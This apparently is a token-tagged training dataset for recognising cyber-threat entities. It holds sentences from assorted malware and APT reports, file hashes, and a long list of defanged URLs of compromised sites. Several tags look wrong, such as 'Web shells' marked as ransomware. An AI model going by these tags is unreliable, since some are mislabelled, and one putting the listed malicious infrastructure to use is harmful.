ns1.gpass1.org B-url.unknown

Execute O
contents O
in O
unlabeled O
textbox1 O
as O
a O
SQL O
statement O
and O
return O
valid O
textual O
data O
to O
adversary O
. O

To O
recover O
or O
identify O
the O
backup O
VBR O
a O
search O
will O
need O
to O
be O
run O
across O
the O
image O
file O
. O

We O
will O
try O
to O
cover O
them O
in O
this O
publication O
, O
but O
let O
us O
first O
recap O
the O
story O
so O
far O
. O

1 O
. O

http://demo1.ftpaccess.cc/ B-url.unknown
demo/ad.jpg I-url.unknown
Other O
domains O
associated O
with O
Aurora B-malware.infosteal
. O

If O
the O
two O
operations O
are O
indeed O
related O
, O
this O
might O
indicate O
the O
group O
decided O
it O
needed O
to O
change O
its O
TTPs O
to O
avoid O
detection O
. O

The O
network O
communication O
between O
the O
Gh0st B-malware.backdoor
RAT I-malware.backdoor
C2 O
client O
and O
a O
compromised O
host O
( O
server O
) O
is O
AES O
encrypted O
using O
the O
same O
string O
' O
Mother360 O
' O
to O
derive O
the O
decryption O
key O
. O

We O
suspect O
that O
the O
person O
or O
persons O
behind O
the O
group O
are O
Chinese O
, O
due O
in O
part O
to O
the O
following O
findings O
: O
. O

Darkhotel B-malware.infosteal
now O
tends O
to O
hide O
its O
code O
behind O
layers O
of O
encryption O
. O

Visit O
avast.com O
English O
Menu O
Threat O
Intelligence O
Team O
, O
21 O
February O
2018 O

expects O
an O
encoded O
string O
between O
a O
pair O
of O
tags O
in O
the O
response O
. O

and O
creates O
the O
service O
' O
Remote O
Access O
Service O
' O
, O
adjusted O
to O
execute O
C:WindowsSystem32vcmon.exe O
at O
system O
startup O
. O

In O
all O
of O
these O
cases O
, O
we O
operate O
under O
strict O
confidentiality O
rules O
with O
our O
customers O
and O
can O
not O
reveal O
publicly O
any O
information O
about O
these O
attacks O
. O

Thus O
, O
contractors O
must O
learn O
to O
play O
the O
game O
— O
enough O
surface-level O
adherence O
to O
the O
regime O
's O
ideology O
— O
to O
gain O
temporary O
reprieves O
from O
suspicion O
long O
enough O
to O
be O
given O
contracted O
work O
. O

-- O
- O

A O
direct O
trail O
was O
established O
over O
a O
period O
of O
years O
that O
would O
lead O
competent O
researchers O
to O
finger O
CN O
operators O
as O
responsible O
for O
this O
new O
activity O
as O
well O
. O

Asruex B-malware.drop
downloads O
a O
DLL O
, O
loads O
it O
into O
the O
memory O
and O
executes O
DLL O
's O
export O
function O
, O
Get_CommandProc O
. O

Both O
Diskcoder.C O
and O
Win32/Filecoder.AESNI.C O
used O
a O
supply-chain O
attack O
as O
the O
initial O
infection O
vector O
. O

After O
a O
Skype O
file O
transfer O
concludes O
, O
the O
following O
file O
is O
created O
: O
% O
USERPROFILE O
% O
\Local O
Settings\Temp\smtXX.tmp O
. O

Figure O
11 O
: O
Encoded O
string O
Figure O
12 O
: O
First O
breakpoint O
Figure O
13 O
: O
Breakpoint O
on O
0142bfee O
hit O
Figure O
14 O
: O
Use O
' O
a O
' O
command O
to O
write O
instructions O
over O
the O
current O
eip O
location O
Figure O
15 O
: O
New O
disassembly O
code O
Figure O
16 O
: O
Breakpoints O
and O
dump O
of O
decoded O
string O
Figure O
17 O
: O
Decoded O
strings O

The O
C2 O
domain O
was O
associated O
with O
multiple O
IP O
addresses O
in O
past O
as O
shown O
below O
During O
the O
timeline O
of O
this O
cyber O
attack O
most O
of O
these O
IP O
addresses O
were O
located O
in O
Pakistan O
and O
few O
IP O
addresses O
used O
the O
hosting O
provider O
infrastructure O
as O
shown O
in O
the O
screen O
shot O
below O
Below O
screenshot O
shows O
the O
timeline O
when O
these O
IP O
addresses O
were O
active O
. O

PressReader O
< O
infodept@cloudsend[.]net O
> O
Angela O
Suh O
< O
angela.suh@cloudsend[.]net O
> O
Ashley O
Safronoff O
< O
ashley.safronoff@cloudsend[.]net O
> O
Lindsey O
Hersh O
< O
lindsey.hersh@cloudsend[.]net O
> O
Sarah O
Roberto O
sarah.roberto@cloudsend[.]net O
noreply@cloudsend[.]net O
Macron O
Denies O
Authenticity O
Of O
Leak O
, O
French O
Prosecutors O
Open O
Probe O
Macron O
Document O
Leaker O
Releases O
New O
Images O
, O
Promises O
More O
Information O
Are O
Emmanuel O
Macron O
's O
Tax O
Evasion O
Documents O
Real O
? O

logins O
id.pdf O
id.jpg O

Differences O
with O
regards O
to O
Backdoor O
commands O
: O
CMD O
ID O
5.0.0 O
beta1/5.1.1 O
rc/5.1.2 O
5.2.0 O
rev1 O
0x97A168D9697D40DD B-hash
0x7CF812296CCC68D5 B-hash
0x652CB1CEFF1C0A00 B-hash
0x27595F1F74B55278 B-hash
Save O
File O
Upload O
File O
Load O
New O
PE O
file O
Save O
File O
and O
Execute O
If O
no O
match O
above O
Execute O
Command O
or O
File O
The O
differences O
shown O
in O
the O
table O
above O
are O
subtle O
but O
present O
. O

The O
U.S. O
Government O
assesses O
that O
information O
was O
leaked O
to O
the O
press O
and O
publicly O
disclosed O
. O

Author O
: O

It O
looks O
like O
they O
took O
the O
' O
Family O
Planning O
Association O
of O
Bangladesh O
' O
and O
combined O
it O
with O
' O
Joint O
Base O
Andrews O
. O
' O

Once O
we O
have O
decoded O
the O
string O
, O
further O
reverse O
engineering O
becomes O
trivial O
. O

PCC_SOCK O
is O
an O
abstraction O
for O
the O
communication O
subsystem O
. O

Once O
invoked O
, O
trilog.exe O
checked O
the O
status O
of O
the O
controller O
, O
then O
read O
the O
configuration O
information O
exposed O
by O
the O
TriStation O
protocol O
. O

The O
domain O
name O
java-se.com B-url.normal
is O
known O
bad O
and O
associated O
with O
APT O
activity O
. O

Compare O
that O
to O
other O
Web B-malware.ransom
shells I-malware.ransom
such O
as O
Laudanum O
( O
619 O
bytes O
) O
or O
RedTeam O
Pentesting O
( O
8,527 O
bytes O
) O
. O

KIDA O
is O
organized O
into O
seven O
research O
centers O
: O
the O
Center O
for O
Security O
and O
Strategy O
; O
the O
Center O
for O
Military O
Planning O
; O
the O
Center O
for O
Human O
Resource O
Development O
; O
the O
Center O
for O
Resource O
Management O
; O
the O
Center O
for O
Weapon O
Systems O
Studies O
; O
the O
Center O
for O
Information O
System O
Studies O
; O
and O
the O
Center O
for O
Modeling O
and O
Simulation O
. O

All O
rights O
reserved O
. O

case O
' O
l O
' O
: O

By O
GReAT O
on O
February O
9 O
, O
2016 O
. O

Since O
Win32/Filecoder.AESNI.C O
did O
n't O
spread O
so O
widely O
, O
we O
mistakenly O
assumed O
that O
these O
techniques O
were O
used O
in O
this O
case O
. O

Some O
of O
the O
key O
obfuscation O
techniques O
used O
are O
: O
Character O
Replacement O
: O
Several O
instances O
of O
character O
replacement O
and O
string O
reversing O
techniques O
( O
Figure O
10 O
) O
make O
analysis O
difficult O
. O

Thanks O
to O
Marcia O
Hofmann O
and O
the O
Electronic O
Frontier O
Foundation O
( O
EFF O
) O
. O

For O
targets O
in O
which O
a O
victim O
is O
seated O
in O
an O
organization O
that O
has O
an O
SSL O
Inspection O
device O
, O
the O
malware O
takes O
this O
additional O
step O
to O
further O
hide O
its O
network O
activity O
. O

createRandomSymbols O
: O
] O

Chafer O
's O
recent O
activities O
indicate O
that O
the O
group O
remains O
highly O
active O
, O
is O
continuing O
to O
hone O
its O
tools O
and O
tactics O
, O
and O
has O
become O
more O
audacious O
in O
its O
choice O
of O
targets O
. O

Below O
screen O
shot O
shows O
the O
logic O
used O
to O
extract O
the O
URL O
and O
the O
command O
strings O
, O
in O
the O
below O
screen O
shot O
the O
extracted O
command O
string O
is O
stored O
in O
the O
variable O
ServerTask1Permission O
. O

The O
samples O
were O
Word O
documents O
with O
a O
macro O
version O
of O
DustySky B-malware.drop
. O

Let O
's O
try O
to O
imagine O
what O
the O
driver O
creation O
process O
looks O
like O
. O

ACTIONABLE O
INTELLIGENCE O

HKEY_CLASSES_ROOTHwp.Document.7shellopencommand O
HKEY_CLASSES_ROOTHwp.Document.8shellopencommand O

Updated O
AF O
MOD O
contract O
- O
Jan O
2018.exe O
remove_pw_Reschedule O
of O
CISD O
Regular O
Meeting.exe O
Sorchornor_with_PM_-_Sep_2017.exe O
20170905-Evaluation O
Table.xls.exe O
CV_LeHoangThing.doc.exe.Fake O
résumé O
( O
CV O
) O
documents O
were O
also O
seen O
in O
Canada O
. O

109 O
, O
' O
NEWCT2 B-malware.backdoor
' O

We O
have O
not O
yet O
seen O
the O
Moafee B-malware.infosteal
group O
use O
this O
tool O
. O

An O
example O
is O
shown O
in O
Figure O
3 O
. O

The O
data O
obtained O
and O
the O
available O
information O
about O
the O
drivers O
used O
in O
Duqu B-malware.infosteal
( O
see O
The O
Mystery O
of O
Duqu B-malware.infosteal
, O
Part O
One O
and O
Part O
Two O
) O
can O
be O
summed O
up O
in O
the O
table O
below O
: O

The O
following O
table O
describes O
the O
role O
of O
each O
module O
: O
Module O
Name O
Purpose O
Penny O
Takes O
a O
screenshot O
of O
the O
infected O
machine O
and O
sends O
it O
to O
the O
server O
Wolowitz_Helberg B-malware.unknown
Enumerates O
running O
processes O
, O
saves O
their O
names O
and O
their O
IDs O
in O
' O
sat.txt O
' O
and O
sends O
the O
file O
to O
the O
server O
Celal_Al B-malware.unknown
Sends O
a O
list O
of O
documents O
with O
certain O
extensions O
. O

To O
allow O
the O
VNC O
session O
to O
connect O
, O
the O
current O
network O
socket O
WSAProtcol_Info O
structure O
is O
written O
to O
a O
named O
pipe O
prior O
to O
calling O
zxFunction001 O
. O

The O
core O
of O
the O
FireEye O
platform O
is O
a O
virtual O
execution O
engine O
, O
complemented O
by O
dynamic O
threat O
intelligence O
, O
to O
identify O
and O
block O
cyber O
attacks O
in O
real O
time O
. O

@ O
@ O
d81596a9 O
ferry O
0 O
dir O
5 O

We O
assess O
that O
when O
Iranian O
cyber O
operators O
respond O
to O
the O
U.S. O
withdrawal O
from O
the O
JCPOA O
that O
the O
operations O
will O
be O
staffed O
and O
executed O
by O
capable O
, O
but O
less O
trusted O
contractors O
. O

The O
attackers O
modified O
their O
tool O
. O

The O
control O
measures O
established O
by O
the O
developer O
to O
limit O
the O
use O
and O
proliferation O
of O
the O
30.apk B-malware.backdoor
application O
, O
coupled O
with O
its O
unique O
purpose O
, O
make O
its O
broad O
distribution O
on O
the O
Android O
store O
improbable O
. O

KEY O
FINDINGS O

Initial O
state O
of O
substitution O
table O
stable_var_41C O

< O
? O
xml O
version='1.0 O
' O
encoding='UTF-8 O
' O
standalone='yes O
' O
? O

The O
screenshot O
illustrates O
only O
a O
subset O
of O
the O
data O
being O
tracked O
by O
HBGary O
, O
and O
sensitive O
information O
has O
been O
redacted O
. O

Domain O
Details O
VirusTotal B-url.normal

Attackers O
are O
banking O
on O
network O
vulnerabilities O
and O
inherent O
weaknesses O
to O
facilitate O
massive O
malware O
attacks O
, O

In O
contrast O
, O
here O
is O
an O
extracted O
PoisonIvy O
configuration O
block O
from O
a O
' O
Moafee B-malware.infosteal
' O
instance O

games-playbox[.]com B-url.cncsvr
worldvoicetrip[.]com B-url.cncsvr

If O
the O
backdoor O
finds O
no O
valid O
pair O
of O
C O
& O
C O
address O
and O
port O
number O
delimited O
with O
the O
' O
: O
' O
character O
, O
it O
quits O
. O

Figure O
2 O
displays O
another O
APT32 B-malware.infosteal
lure O
that O
used O
a O
convincing O
image O
of O
a O
fake O
Windows O
error O
message O
instructing O
the O
recipient O
to O
enable O
content O
to O
properly O
display O
document O
font O
characters O
. O

These O
modules O
are O
used O
for O
communication O
with O
the O
C O
& O
C O
server O
, O
encryption O
and O
encoding O
and O
- O
most O
importantly O
- O
for O
data O
exfiltration O
and O
espionage O
. O

SHA1-1 O
Filename O
ESET O
Detection O
Name O

31 O
. O

Sarah O
and O
Fred O

Fig O
4 O
. O

Talos O
receives O
samples O
from O
over O
100 O
external O
feeds O
ranging O
from O
anti-malware O
companies O
to O
research O
centers O
, O
while O
the O
AMP O
dataset O

x509 O
fingerprint O

Appendix O
C O
: O
Moafee B-malware.infosteal
and O
DragonOK B-malware.infosteal
Clusters O
......................................................................................................................................................................................... O
23 O

On O
3rd O
February O
2017 O
, O
researchers O
at O
badcyber.com B-url.normal
released O
an O
article O
that O
detailed O
a O
series O
of O
attacks O
directed O
at O
Polish O
financial O
institutions O
. O

Commands O
with O
a O
? O

The O
implant O
does O
not O
conduct O
financial O
transactions O
; O
rather O
it O
is O
a O
channel O
into O
the O
victim O
's O
environment O
, O
in O
which O
further O
stages O
of O
implants O
can O
be O
deployed O
for O
financial O
reconnaissance O
. O

Updated O
the O
detection O
names O
on O
January O
25 O
, O
2018 O
, O
9:47 O
PM O
PDT O

If O
there O
are O
no O
queued O
packets O
, O
PCC_CMD O
: O
:ReadWaitingData O
will O
perform O
a O
queue O
of O
the O
console O
output O
pipe O
for O
the O
remote O
shell O
process O
( O
if O
it O
is O
active O
) O
; O
the O
function O
will O
also O
attempt O
to O
read O
the O
entirety O
of O
the O
waiting O
data O
, O
which O
then O
becomes O
the O
payload O
of O
a O
PacketHeader O
/ O
PCCCMDPacketHeader O

.doc O
Turkey O
009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0 B-hash
18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6 B-hash
idrbt.doc O
India O
Türkiye O
Cumhuriyeti O
Kimlik O
Kartı.doc O
Turkey O
Turkish O
Armed O
Forces.doc O
3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb B-hash
9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c B-hash
Turkish O
Armed O
Forces.doc O
na.gov.pk.doc O
Turkey O
Pakistan O
3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115 B-hash
MVD-FORM-1800.doc O
Tajikistan O
cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88 B-hash
KEGM-CyberAttack.doc O
Turkey O
1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942 B-hash
IL-1801.doc O
aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627 B-hash
kiyiemniyeti.doc O
Turkey O
Turkey O
93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84 B-hash
TCELL-S1-M.doc O
Tajikistan O
c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9 B-hash
egm-1.doc O
Turkey O
2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13 B-hash
Connectel O
.pk.doc O
Pakistan O
18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd B-hash
gÃŸvenlik_yÃœnergesi_.doc O
Turkey O
153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58 B-hash
MIT.doc O
Turkey O
d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025 B-hash
Gvenlik O
Ynergesi.doc O
Turkey O
af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102 B-hash
Gvenlik O
Ynergesi.doc O
Turkey O
5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af B-hash
Turkey O
5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af B-hash
3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c B-hash
Anadolu O
GÃ O
neydoÄŸu O
Projesinde O
.doc O
Turkey O
Turkey O
hxxp://alessandrofoglino[.]com//db_template.php B-url.unknown
hxxp://www.easy-home-sales[.]co.za//db_template.php B-url.unknown
hxxp://www.almaarefut[.]com/admin/db_template.php B-url.unknown
hxxp://chinamall[.]co.za//db_template.php B-url.unknown
hxxp://amesoulcoaching[.]com//db_template.php B-url.unknown
hxxp://www.antigonisworld[.]com/wp-includes/db_template.php B-url.unknown
hxxps://anbinni.ba/wp-admin/db_template.php B-url.unknown
hxxp://arctistrade[.]de/wp/db_template.php B-url.unknown
hxxp://aianalytics[.]ie//db_template.php B-url.unknown
hxxp://www.gilforsenate[.]com//db_template.php B-url.unknown
hxxp://mgamule[.]co.za/oldweb/db_template.php B-url.unknown
hxxp://chrisdejager-attorneys[.]co.za//db_template.php B-url.unknown
hxxp://alfredocifuentes[.]com//db_template.php B-url.unknown
hxxp://alxcorp[.]com//db_template.php B-url.unknown
hxxps://www.aircafe24[.]com//db_template.php B-url.unknown
hxxp://agencereferencement.be/wp-admin/db_template.php B-url.unknown
hxxp://americanlegacies[.]org/webthed_ftw/db_template.php B-url.unknown
hxxps://aloefly[.]net//db_template.php B-url.unknown
hxxp://www.duotonedigital[.]co.za//db_template.php B-url.unknown
hxxp://architectsinc[.]net//db_template.php B-url.unknown
hxxp://www.tanati[.]co.za//db_template.php B-url.unknown
hxxp://emware[.]co.za//db_template.php B-url.unknown
hxxp://breastfeedingbra[.]co.za//db_template.php B-url.unknown
hxxp://alhidayahfoundation[.]co[.]uk/category/db_template.php B-url.unknown
hxxp://cashforyousa[.]co.za//db_template.php B-url.unknown
hxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.php B-url.unknown
hxxp://antjetaubert[.]de//db_template.php B-url.unknown
hxxp://hesterwebber[.]co.za//db_template.php B-url.unknown
hxxp://fickstarelectrical[.]co.za//db_template.php B-url.unknown
hxxp://alex-frost[.]com/assets/db_template.php B-url.unknown
hxxps://americanbrasil[.]com.br//db_template.php B-url.unknown
hxxps://aileeshop[.]com//db_template.php B-url.unknown
hxxps://annodle[.]com//db_template.php B-url.unknown
hxxp://goldeninstitute[.]co.za/contents/db_template.php B-url.unknown
hxxp://ednpk[.]com//db_template.php B-url.unknown
hxxp://www.arabiccasinochoice[.]com//db_template.php B-url.unknown
hxxp://proeventsports[.]co.za//db_template.php B-url.unknown
hxxp://glenbridge[.]co.za//db_template.php B-url.unknown
hxxp://berped[.]co.za//db_template.php B-url.unknown
hxxp://best-digital-slr-cameras[.]com//db_template.php B-url.unknown
hxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.php B-url.unknown
hxxp://www.alpacal[.]com//db_template.php B-url.unknown
hxxps://www.alakml[.]com/wp-admin/db_template.php B-url.unknown
hxxp://ar-rihla[.]com//db_template.php B-url.unknown
hxxp://appsvoice[.]info//db_template.php B-url.unknown
hxxp://www.bashancorp[.]co.za//db_template.php B-url.unknown
hxxp://alexanderbecker[.]net/services/db_template.php B-url.unknown
hxxp://visionclinic.co.ls/visionclinic/db_template.php B-url.unknown
hxxps://www.angelesrevista[.]com//db_template.php B-url.unknown
hxxps://www.antojoentucocina[.]com//db_template.php B-url.unknown
hxxp://apollonweb[.]com//db_template.php B-url.unknown
hxxps://www.alphapixa[.]com//db_template.php B-url.unknown
hxxp://capitalradiopetition[.]co.za//db_template.php B-url.unknown
hxxp://www.generictoners[.]co.za//db_template.php B-url.unknown
hxxps://alnahdatraining[.]com//db_template.php B-url.unknown
hxxps://albousala[.]com//db_template.php B-url.unknown
hxxps://www.dopetroleum[.]com//db_template.php B-url.unknown
hxxp://bios-chip[.]co.za//db_template.php B-url.unknown
hxxp://www.crissamconsulting[.]co.za//db_template.php B-url.unknown
hxxp://capriflower[.]co.za//db_template.php B-url.unknown
hxxp://www.dingaanassociates[.]co.za//db_template.php B-url.unknown
hxxp://indiba-africa[.]co.za//db_template.php B-url.unknown
hxxp://verifiedseller[.]co.za/js/db_template.php B-url.unknown
hxxps://www.buraqlubricant[.]com//db_template.php B-url.unknown
hxxp://aqarco[.]com/wp-admin/db_template.php B-url.unknown
hxxp://allaboutblockchain[.]net//db_template.php B-url.unknown
hxxp://www.amexcars[.]info/tpl/db_template.php B-url.unknown
hxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.php B-url.unknown
hxxp://bakron[.]co.za//db_template.php B-url.unknown
hxxp://gsnconsulting[.]co.za//db_template.php B-url.unknown
hxxp://vumavaluations[.]co.za//db_template.php B-url.unknown
hxxp://heritagetravelmw[.]com//db_template.php B-url.unknown
hxxp://ampvita[.]com//db_template.php B-url.unknown
hxxp://ahero-resource-center[.]org/administrator/db_template.php B-url.unknown
hxxps://arbulario[.]com//db_template.php B-url.unknown
hxxp://havilahglo[.]co.za/wpscripts/db_template.php B-url.unknown
hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php B-url.unknown
hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php B-url.unknown
hxxp://delectronics[.]com[.]pk//db_template.php B-url.unknown
hxxp://antucomp[.]com//db_template.php B-url.unknown
hxxp://advocatetn[.]com/font-awesome/fonts/db_template.php B-url.unknown
hxxps://amooy[.]com/webservice/db_template.php B-url.unknown
hxxp://www.harmonyguesthouse[.]co.za//db_template.php B-url.unknown
hxxp://alanrori[.]com//db_template.php B-url.unknown
hxxp://algarvesup[.]com//db_template.php B-url.unknown
hxxp://desirablehair[.]co.za//db_template.php B-url.unknown
hxxp://comsip[.]org.mw//db_template.php B-url.unknown
hxxp://jdcorporate[.]co.za/catalog/db_template.php B-url.unknown
hxxp://andrewfinnburhoe[.]com//db_template.php B-url.unknown
hxxp://anyeva[.]com/wp-includes/db_template.php B-url.unknown
hxxp://www.agenceuhd[.]com//db_template.php B-url.unknown
hxxp://host4unix[.]net/host24new/db_template.php B-url.unknown
hxxp://www.altaica[.]ca/wordpress/db_template.php B-url.unknown
hxxp://www.allbuyer[.]co[.]uk//db_template.php B-url.unknown
hxxp://jvpsfunerals[.]co.za//db_template.php B-url.unknown
hxxp://immaculatepainters[.]co.za//db_template.php B-url.unknown
hxxp://tcpbereka[.]co.za/js/db_template.php B-url.unknown
hxxp://clientcare.co.ls//db_template.php B-url.unknown
hxxp://investaholdings[.]co.za/htc/db_template.php B-url.unknown
hxxp://www.amjobs[.]co[.]uk//db_template.php B-url.unknown
hxxp://www.agirlgonewine[.]com/store/db_template.php B-url.unknown
hxxp://findinfo-more[.]com//db_template.php B-url.unknown
hxxp://asgen[.]org//db_template.php B-url.unknown
hxxp://alphasalesrecruitment[.]com//db_template.php B-url.unknown
hxxp://irshadfoundation[.]co.za//db_template.php B-url.unknown
hxxp://analternatif[.]com/includes/db_template.php B-url.unknown
hxxp://arbruisseau[.]com/profiles/db_template.php B-url.unknown
hxxp://ladiescircle[.]co.za//db_template.php B-url.unknown
hxxp://all-reseller[.]com/zzz_backup/db_template.php B-url.unknown
hxxp://alcatrazmoon[.]com/images/db_template.php B-url.unknown
hxxp://www.alcalumni[.]com/wp-includes/db_template.php B-url.unknown
hxxp://aniljoseph[.]com/servermon/db_template.php B-url.unknown
hxxp://alwake3press[.]com/wp-includes/db_template.php B-url.unknown
hxxp://www.hfhl[.]org.ls/habitat/db_template.php B-url.unknown
hxxp://alcafricanos[.]com/slsmonographs/db_template.php B-url.unknown
hxxps://agapeencounter[.]org//db_template.php B-url.unknown
hxxp://apobiomedix[.]ca//db_template.php B-url.unknown
hxxp://anythinglah[.]info//db_template.php B-url.unknown
hxxp://aniroleplay[.]net//db_template.php B-url.unknown
hxxp://aniroleplay[.]net//db_template.php B-url.unknown
hxxp://www.allcopytoners[.]com//db_template.php B-url.unknown
hxxp://alphaobring[.]com//db_template.php B-url.unknown
hxxp://www.galwayprimary[.]co.za//db_template.php B-url.unknown
hxxp://alnuzha[.]org/en/db_template.php B-url.unknown
hxxps://ancient-wisdoms[.]com//db_template.php B-url.unknown
hxxp://amazingenergysavings[.]net//db_template.php B-url.unknown
hxxp://gvs[.]com[.]pk/font-awesome/db_template.php B-url.unknown
hxxp://geetransfers[.]co.za/font-awesome/db_template.php B-url.unknown
hxxp://carlagrobler[.]co.za/components/db_template.php B-url.unknown
hxxp://amazingashwini[.]com//db_template.php B-url.unknown
hxxp://aminearserver[.]es//db_template.php B-url.unknown
hxxp://lensofafrica[.]co.za//db_template.php B-url.unknown
hxxp://greenacrestf[.]co.za/video/db_template.php B-url.unknown
hxxp://www.tonaro[.]co.za//db_template.php B-url.unknown
hxxp://alephit2[.]biz/kitzz/db_template.php B-url.unknown
hxxp://lppaportal[.]org.ls//db_template.php B-url.unknown
hxxp://alkousy[.]com//db_template.php B-url.unknown
hxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.php B-url.unknown
hxxp://fragranceoil[.]co.za//db_template.php B-url.unknown
hxxp://www.eloquent[.]co.za/nweb2/db_template.php B-url.unknown
hxxp://chrishanicdc[.]org/wpimages/db_template.php B-url.unknown
hxxp://ahc.me[.]uk//db_template.php B-url.unknown
hxxp://www.britishasia-equip[.]co[.]uk//db_template.php B-url.unknown
hxxp://always-beauty[.]ch//db_template.php B-url.unknown
hxxps://www.ancamamara[.]com/wp-admin/db_template.php B-url.unknown
hxxp://entracorntrading[.]co.za//db_template.php B-url.unknown
hxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.php B-url.unknown
hxxp://americabr[.]com.br//db_template.php B-url.unknown
hxxp://andrew-snyder[.]net/bootstrap/db_template.php B-url.unknown
hxxp://signsoftime[.]co.za//db_template.php B-url.unknown
hxxp://aperta-armis[.]org//db_template.php B-url.unknown
hxxp://absfinancialplanning[.]co.za/images/db_template.php B-url.unknown
hxxp://charispaarl[.]co.za//db_template.php B-url.unknown
hxxp://indlovusecurity[.]co.za//db_template.php B-url.unknown
hxxp://alcafricandatalab[.]com//db_template.php B-url.unknown
hxxp://amor-clubhotels[.]com//db_template.php B-url.unknown
hxxp://mokorotlocorporate[.]com//db_template.php B-url.unknown
hxxp://apppriori[.]com//db_template.php B-url.unknown
hxxp://luxconprojects[.]co.za//db_template.php B-url.unknown
hxxp://androidphonetips[.]com/wp-includes/db_template.php B-url.unknown
hxxp://angel-seeds[.]com.ua/catalog/db_template.php B-url.unknown
hxxp://angel-seeds[.]com.ua/catalog/db_template.php B-url.unknown
hxxp://alissanicolai[.]com/assets/db_template.php B-url.unknown
hxxps://www.amateurastronomy[.]org//db_template.php B-url.unknown
hxxp://aiofotoevideo[.]com//db_template.php B-url.unknown
hxxp://www.amika.hr//db_template.php B-url.unknown
hxxp://comfortex[.]co.za/php/db_template.php B-url.unknown
hxxp://deepgraphics[.]co.za//db_template.php B-url.unknown
hxxps://agiledepot[.]com//db_template.php B-url.unknown
hxxp://almatours[.]gr//db_template.php B-url.unknown
hxxp://analystcnwang[.]com//db_template.php B-url.unknown
hxxp://www.malboer[.]co.za/trendy1/db_template.php B-url.unknown
hxxp://sefikengfarm.co.ls//db_template.php B-url.unknown
hxxp://www.antirughenaturale[.]com/wp-admin/db_template.php B-url.unknown
hxxp://passright[.]co.za//db_template.php B-url.unknown
hxxp://seismicfactory[.]co.za//db_template.php B-url.unknown
hxxp://alessandroalessandrini[.]it//db_template.php B-url.unknown
hxxps://aquabsafe[.]com//db_template.php B-url.unknown
hxxp://amatikulutours[.]com/tmp/db_template.php B-url.unknown
hxxp://ganitis[.]gr//db_template.php B-url.unknown
hxxp://aleenasgiftbox[.]com/admin/db_template.php B-url.unknown
hxxps://allusdoctors[.]com/themes/db_template.php B-url.unknown
hxxp://alainsaffel[.]com//db_template.php B-url.unknown
hxxp://www.ariehandomri[.]com//db_template.php B-url.unknown
hxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.php B-url.unknown
hxxp://itengineering[.]co.za/gatewaydiamond/db_template.php B-url.unknown
hxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.php B-url.unknown
hxxp://www.albertamechanical[.]ca//db_template.php B-url.unknown
hxxp://alchamel[.]info//db_template.php B-url.unknown
hxxps://almokan[.]net/wp-includes/db_template.php B-url.unknown
hxxp://jakobieducation[.]co.za//db_template.php B-url.unknown
hxxps://arc-sec[.]net//db_template.php B-url.unknown
hxxp://ldams[.]org.ls/supplies/db_template.php B-url.unknown
hxxp://menaboracks[.]co.za/tmp/db_template.php B-url.unknown
hxxp://www.getcord[.]co.za//db_template.php B-url.unknown
hxxp://boardaffairs[.]com//db_template.php B-url.unknown
hxxp://capetownway[.]co.za//db_template.php B-url.unknown
hxxp://cloudhostdesign[.]com//db_template.php B-url.unknown
hxxp://hartenboswaterpark[.]co.za/templates/db_template.php B-url.unknown
hxxp://fccorp[.]co.za/php/db_template.php B-url.unknown
hxxp://angar68[.]com//db_template.php B-url.unknown
hxxp://www.dws-gov[.]co.za//db_template.php B-url.unknown
hxxp://alwahahweb[.]com//db_template.php B-url.unknown
hxxp://alwahahweb[.]com//db_template.php B-url.unknown
hxxp://anuragcreatives[.]com//db_template.php B-url.unknown
hxxp://embali[.]co.za//db_template.php B-url.unknown
hxxp://albertaedmonton[.]com/widgetstyles/db_template.php B-url.unknown
hxxp://altosdefontana[.]com//db_template.php B-url.unknown
hxxp://airfanhydro[.]net//db_template.php B-url.unknown
hxxps://www.alexponcet[.]com/wp-includes/db_template.php B-url.unknown
hxxp://agropecuariavilarica[.]com.br//db_template.php B-url.unknown
hxxps://www.amazingbuyrd[.]com/admin/db_template.php B-url.unknown
hxxp://cdxtrading[.]co.za//db_template.php B-url.unknown
hxxp://interafricaconsulting[.]com/wpimages/db_template.php B-url.unknown
hxxp://glgroup[.]co.za/images/db_template.php B-url.unknown
hxxp://hisandherskennels[.]co.za/php/db_template.php B-url.unknown
hxxp://alemaohost[.]com/lotosorg[.]com/db_template.php B-url.unknown
hxxp://isibaniedu[.]co.za/admin/db_template.php B-url.unknown
hxxp://dianakleyn[.]co.za/layouts/db_template.php B-url.unknown
hxxp://themotoringcalendar[.]co.za//db_template.php B-url.unknown
hxxp://www.loansonhomes[.]co.za//db_template.php B-url.unknown
hxxp://edgesecurity[.]co.za/js/db_template.php B-url.unknown
hxxp://highschoolsuperstar[.]co.za/files/db_template.php B-url.unknown
hxxp://www.ambientproperty[.]com//db_template.php B-url.unknown
hxxp://animationshowreel[.]co.il//db_template.php B-url.unknown
